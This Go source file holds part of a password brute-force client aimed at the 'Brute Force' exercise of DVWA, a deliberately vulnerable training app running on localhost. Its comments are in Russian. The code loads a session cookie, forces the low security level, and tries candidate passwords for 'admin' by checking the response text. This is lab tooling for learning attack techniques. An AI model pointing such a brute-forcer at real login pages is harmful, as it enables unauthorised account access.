package main

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const endpoint = "http://127.0.0.1:4280/vulnerabilities/brute/"
const username = "admin"

// Из Netscape-файла нужна только сессия. Уровень low отправляем явно.
func readSession(path string) (string, error) {
	file, err := os.Open(path)

	if err != nil {
		return "", err
	}

	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := strings.TrimPrefix(scanner.Text(), "#HttpOnly_")

		if strings.HasPrefix(line, "#") || strings.TrimSpace(line) == "" {
			continue
		}

		fields := strings.Split(strings.TrimSuffix(line, "\r"), "\t")

		if len(fields) == 7 && fields[0] == "127.0.0.1" && fields[2] == "/" && fields[5] == "PHPSESSID" && fields[6] != "" {
			return fields[6], nil
		}
	}

	if err := scanner.Err(); err != nil {
		return "", err
	}

	return "", fmt.Errorf("в %s нет PHPSESSID для 127.0.0.1; экспортируй cookie после входа в DVWA", path)
}

type dvwa struct {
	client   *http.Client
	endpoint string
	session  string
	pace     <-chan time.Time
}

func newDVWA(session string, workers int) *dvwa {
	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.Proxy = nil
	transport.MaxIdleConnsPerHost = workers

	return &dvwa{
		endpoint: endpoint,
		session:  session,
		client: &http.Client{
			Transport: transport,
			Timeout:   10 * time.Second,
			// Не принимаем страницу входа после редиректа за ответ учебной формы.
			CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
		},
	}
}

// Сохраняем метаданные вместе с телом: HTTP 200 ещё не означает ответ формы.
type httpResponse struct {
	address        string
	status         string
	contentType    string
	location       string
	retryAfter     string
	declaredLength int64
	elapsed        time.Duration
	body           string
}

func (d *dvwa) get(ctx context.Context, query url.Values) (*httpResponse, error) {
	address := d.endpoint

	if query != nil {
		address += "?" + query.Encode()
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, address, nil)

	if err != nil {
		return nil, fmt.Errorf("создание GET-запроса %q: %w", address, err)
	}

	req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: d.session})
	req.AddCookie(&http.Cookie{Name: "security", Value: "low"})

	// Все работники читают один канал. Один тик получает только один работник.
	if d.pace != nil {
		select {
		case <-ctx.Done():
			return nil, ctx.Err()

		case <-d.pace:
		}
	}

	if ctx.Err() != nil {
		return nil, ctx.Err()
	}

	started := time.Now()
	resp, err := d.client.Do(req)

	if err != nil {
		if ctx.Err() != nil {
			return nil, ctx.Err()
		}

		return nil, fmt.Errorf("сбой HTTP-запроса; ответ не получен\nЗапрос: GET %s\nВремя запроса: %s\nПричина: %w", address, time.Since(started), err)
	}

	defer resp.Body.Close()

	const maxBody = 2 * 1024 * 1024

	body, readErr := io.ReadAll(io.LimitReader(resp.Body, maxBody+1))
	response := &httpResponse{
		address: address, status: resp.Status,
		contentType:    resp.Header.Get("Content-Type"),
		location:       resp.Header.Get("Location"),
		retryAfter:     resp.Header.Get("Retry-After"),
		declaredLength: resp.ContentLength,
		elapsed:        time.Since(started), body: string(body),
	}

	if len(body) > maxBody {
		response.body = string(body[:maxBody])

		return nil, &responseError{response, "ответ превысил 2 МиБ; тело в диагностике обрезано"}
	}

	if readErr != nil {
		if ctx.Err() != nil {
			return nil, ctx.Err()
		}

		return nil, &responseError{response, fmt.Sprintf("не удалось полностью прочитать ответ: %v", readErr)}
	}

	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		return nil, &responseError{response, "DVWA перенаправляет запрос; при редиректе на login.php обнови cookie после входа"}
	}

	if resp.StatusCode != http.StatusOK {
		return nil, &responseError{response, "DVWA вернула ошибочный HTTP-статус"}
	}

	return response, nil
}

func (d *dvwa) validateSession(ctx context.Context) error {
	response, err := d.get(ctx, nil)

	if err != nil {
		return err
	}

	if !strings.Contains(response.body, "<h1>Vulnerability: Brute Force</h1>") || !strings.Contains(response.body, "<em>Security Level:</em> low") {
		return &responseError{response, "не удалось открыть форму Brute Force уровня Low; проверь вход в DVWA и cookie"}
	}

	return nil
}

func (d *dvwa) check(ctx context.Context, candidate []byte) (bool, error) {
	response, err := d.get(ctx, url.Values{
		"username": {username}, "password": {string(candidate)}, "Login": {"Login"},
	})

	if err != nil {
		return false, err
	}

	if strings.Contains(response.body, "Welcome to the password protected area admin") {
		return true, nil
	}

	if strings.Contains(response.body, "Username and/or password incorrect.") {
		return false, nil
	}

	return false, &responseError{response, "неожиданный ответ DVWA: нет сообщения об успешном входе или неверном пароле"}
}
